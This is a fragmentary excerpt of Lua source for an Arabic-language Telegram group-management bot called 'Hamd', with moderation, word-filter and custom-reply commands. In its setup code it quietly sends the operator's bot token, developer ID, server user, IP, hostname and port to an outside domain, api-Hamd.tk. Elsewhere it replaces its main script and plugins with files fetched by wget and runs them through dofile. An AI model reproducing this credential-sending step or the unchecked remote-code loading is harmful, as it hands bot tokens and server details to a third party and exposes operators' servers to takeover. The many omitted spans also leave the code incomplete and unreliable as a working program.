...
if res ~= 200 then
print('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝙷𝚊𝚖𝚍 ┉  ┉ ┉ ┉ ┉≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \naٴ≪┉ ┉ ┉ ┉ ┉ 𝙷𝚊𝚖𝚍 ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35mٴ≪┉ ┉ ┉ ┉ ┉ 𝙷𝚊𝚖𝚍 ┉  ┉ ┉ ┉ ┉≫ٴ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua Hamd.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\naٴ≪┉ ┉ ┉ ┉ ┉ 𝙷𝚊𝚖𝚍 ┉  ┉ ┉ ┉ ┉≫ٴ\n\27[0;33;49m')
local SUDOID = io.read():gsub(' ','') 
if tostring(SUDOID):match('%d+') then
data,res = https.request("https://api-Hamd.tk/api-WtttW/Hamd.php?bn=Hamd&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://api-Hamd.tk/api-WtttW/Hamd.php?n=Hamd&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝙷𝚊𝚖𝚍 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end  
os.execute('lua Hamd.lua')
end 
end
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./Hamd.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("DRG", "w")  
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/aVAER200/Files_Hamd/main/File_Bot/commands.lua") 
...
local hash = database:sismember(bot_id.."WtttW:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
...
var = true  
elseif database:sismember(bot_id..'WtttW:MN:TF'..chat_id, user_id) then
var = true 
...
Hamd_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
Hamd_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
Hamd_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
Hamd_Msg = 'امبروطور التفاعل' 
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙵𝙰𝚆𝙰𝚉.")  
...
function plugin_Hamd(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.Hamd and msg then
pre_msg = plugin.Hamd(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceHamd(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,Hamd_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf Hamd.lua')
os.execute('wget https://raw.githubusercontent.com/aVAER200/Hamd/main/Hamd.lua')
...
-------------
if text == "🐉 حصريات و تحديثات حمد 🐉" and DevSoFi(msg) then  
local updatech =[[
*يجب عليك الاشتراك في قناة*
*تحديثات وشروحات سورس حمد*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '📂┇𝙵𝙰𝚆𝙰𝚉 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/tft4t"}},
}
...
send(msg.chat_id_, msg.id_,'℘︙  عدد القروبات الان » { '..#group..' }'..Hamdk..''..Hamd..'\n℘︙  الان عدد القروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
local Hamd1_Msg = database:get(bot_id.."Hamd1:Add:Filter:Rp2"..text..msg.chat_id_)   
if Hamd1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
--------------------------------------------------------------------------------------------------------------
if Hamd_Msg and not Special(msg) then  
local Hamd_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Hamd_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
database:sadd(bot_id.."Hamd:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."Hamd:blocname"..msg.chat_id_)
...
function WtttW_name(t1,t2)
if t2.id_ then 
name_MRSOFI = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."Hamd:blocname"..msg.chat_id_) or ""
...
bnnaGet(msg.sender_user_id_, WtttW_name)
end
...
database:set(bot_id.."Hamd:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."Hamd:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."Hamd:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."Hamd:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."Hamd:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."Hamd:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."Hamd:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."Hamd:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."Hamd:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."Hamd:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "℘︙ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "tft4t")..")\n℘︙ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."Hamd:teh"..msg.chat_id_).."} بجانب اسمك\n℘︙ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local HamdChengName = database:get(bot_id.."Hamd:Cheng:Name"..data.id_)
if not data.first_name_ then 
if HamdChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..HamdChengName..']')
database:del(bot_id.."Hamd:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if HamdChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."Hamd:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local HamdChengUserName = database:get(bot_id.."Hamd:Cheng:UserName"..data.id_)
if not data.username_ then 
if HamdChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..HamdChengUserName..']')
database:del(bot_id.."Hamd:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if HamdChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."Hamd:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local HamdChengPhoto = database:get(bot_id.."Hamd:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if HamdChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."Hamd:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if HamdChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."Hamd:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
℘ ⦑ SOURCE Hamd ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
℘︙ [Source Channel](t.me/tft4t)
℘︙ [Source Update ](t.me/tft4t)     
℘︙ [Source developer](t.me/WtttW)     
℘︙ [Hamd programmer](t.me/WtttW) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS Hamd](t.me/peace1bot)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."WtttW:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'WtttW:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/aVAER200/Files_Hamd/main/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/aVAER200/Files_Hamd/main/File_Bot/"..file)
if res == 200 then
...
local UserName = (b.username_ or "aVAER200")
...
function Function_Hamd(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Hamd, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Hamd, nil)
return false 
end
...
database:del(bot_id..'WtttW:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ℘︙ تم مسح المنظفين')
end
if text == ("المنظفين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'WtttW:MN:TF'..msg.chat_id_)
t = "\n ℘︙ قائمة المنظفين \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'WtttW:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'tft4t')..')'
status  = '\n ℘︙ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
...
database:sadd(bot_id..'WtttW:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'tft4t')..')'
status  = '\n ℘︙ تم ترقيته منظف'
texts = usertext..status
else
...
database:sadd(bot_id..'WtttW:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'tft4t')..')'
status  = '\n ℘︙ تم ترقيته منظف'
...
function start_function(extra, result, success)
database:srem(bot_id..'WtttW:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'tft4t')..')'
...
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'WtttW:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'tft4t')..')'
status  = '\n ℘︙ تم تنزيله من المنظفين'
texts = usertext..status
else
...
database:srem(bot_id..'WtttW:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'tft4t')..')'
status  = '\n ℘︙ تم تنزيله من المنظفين'
...
database:set(bot_id.."Hamd1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Hamd1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ℘︙ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."Hamd1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Hamd1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Hamd1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Hamd1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ℘︙ تم منع الكلمه مع التحذير")  
database:del(bot_id.."Hamd1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Hamd1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Hamd1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Hamd1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ℘︙ ارسل الكلمه الان")  
database:set(bot_id.."Hamd1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Hamd1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."Hamd1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Hamd1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Hamd1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."Hamd1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Hamd1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Hamd1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Hamd1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ℘︙ قائمة المنع \nٴ≪┉ ┉ ┉ ┉ ┉ 𝙷𝚊𝚖𝚍 ┉  ┉ ┉ ┉ ┉≫ٴ\n"
for k,v in pairs(list) do  
local Hamd_Msg = database:get(bot_id.."Hamd1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..Hamd_Msg.."}\n"    
end  
if #list == 0 then  
...
if not database:get(bot_id..'WtttW:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
...
database:setex(bot_id..'WtttW:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
...
database:sadd(bot_id.."WtttW:allM"..msg.chat_id_, msg.id_)
end
if text == ("امسح") and cleaner(msg) then  
local list = database:smembers(bot_id.."WtttW:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = "℘︙ تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."WtttW:allM"..msg.chat_id_)
end
end
if #list == 0 then
...
local num = database:smembers(bot_id.."WtttW:allM"..msg.chat_id_)
...
send(msg.chat_id_, msg.id_,'['..Hamd_Msg[math.random(#Hamd_Msg)]..']') 
return false
end
...
if database:sismember(bot_id..'WtttW:MN:TF'..msg.chat_id_, result.id_) then
mn = 'منظف ،' else mn = '' end
...
own = 'مدير ،' else own = '' end
if database:sismember(bot_id..'WtttW:MN:TF'..msg.chat_id_, result.sender_user_id_) then
mn = 'منظف ،' else mn = '' end
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:Hamd:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ℘︙ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:Hamd:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:Hamd:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:Hamd:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:Hamd:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"℘︙ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:Hamd:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:Hamd:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:Hamd:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:Hamd:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:Hamd:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:Hamd:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:Hamd:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:Hamd:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:Hamd:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:Hamd:List:Rd:Sudo")
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙵𝙰𝚆𝙰𝚉.',url="t.me/tft4t"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."tft4t:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."tft4t:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."tft4t:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."tft4t:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"℘︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."tft4t:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."tft4t:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس حمد يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:Hamd:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:Hamd:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"℘︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:Hamd:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Hamd:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:Hamd:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Hamd:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:Hamd:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Hamd:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:Hamd:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Hamd:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:Hamd:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Hamd:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:Hamd:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Hamd:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:Hamd:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:Hamd:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:Hamd:Add:Rd:Sudo:Text2"..text)   
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'حمد').." غادر" or text == 'بوت غادر' then  
...
-- vardump(data) 
Hamddx(msg.chat_id_, msg.id_, ' ℘︙ ايدي المجموعة » ( '..msg.chat_id_..' )\n ℘︙ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ℘︙ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ℘︙ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
{
{text = '𝐃𝐑𝐀𝐆𝐎𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/tft4t"},
},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_, msg.id_, t..'ٴ≪┉ ┉ ┉ ┉ ┉ 𝙷𝚊𝚖𝚍 ┉  ┉ ┉ ┉ ┉≫ٴٴ\n℘︙ ➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙵𝙰𝚆𝙰𝚉. ](t.me/tft4t)➤ ')
end
...
Hamd = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Hamd)
...
--------------------------------------------------------------------------------------------------------------
SourceHamd(data.message_,data)
plugin_Hamd(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local HamdAbot = database:get(bot_id.."Hamd1:Add:Filter:Rp2"..text..result.chat_id_)   
if HamdAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ℘︙ ["..HamdAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local Hamd1_Msg = database:get(bot_id.."Hamd1:Add:Filter:Rp2"..text..result.chat_id_)   
if Hamd1_Msg then    
send(msg.chat_id_, msg.id_," ℘︙ "..Hamd1_Msg)
